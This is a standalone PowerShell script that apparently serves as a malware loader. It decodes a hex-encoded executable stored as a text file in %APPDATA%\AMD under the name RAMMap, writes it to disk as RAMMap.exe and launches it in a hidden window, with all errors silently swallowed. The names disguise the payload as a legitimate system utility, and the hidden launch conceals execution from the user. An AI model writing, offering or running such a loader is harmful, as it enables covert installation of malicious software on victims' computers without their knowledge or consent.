# Function to convert HEX back to EXE
function Convert-HexToExe {
    param (
        [string]$hexFilePath,
        [string]$outputExeFile
    )

    try {
        
        $hexString = Get-Content $hexFilePath -Raw # Read the hexadecimal string from the input file
        # Split the hex string into byte pairs (each 2 characters = 1 byte)
        $byteArray = for ($i = 0; $i -lt $hexString.Length; $i += 2) {
            [Convert]::ToByte($hexString.Substring($i, 2), 16)
        }
        [System.IO.File]::WriteAllBytes($outputExeFile, $byteArray) # Write the byte array to the output .exe file
        Start-Process -WindowStyle Hidden -FilePath $outputExeFile # Start the executable
    } catch {
        # Write-Host "Error: $($_.Exception.Message)"
    }
}

# Specify the paths for HEX to EXE conversion
$hexFilePath = "$env:APPDATA\AMD\RAMMap.txt"
$outputExeFile = "$env:APPDATA\AMD\RAMMap.exe"

# Call the function to perform the conversion and run the EXE
Convert-HexToExe -hexFilePath $hexFilePath -outputExeFile $outputExeFile
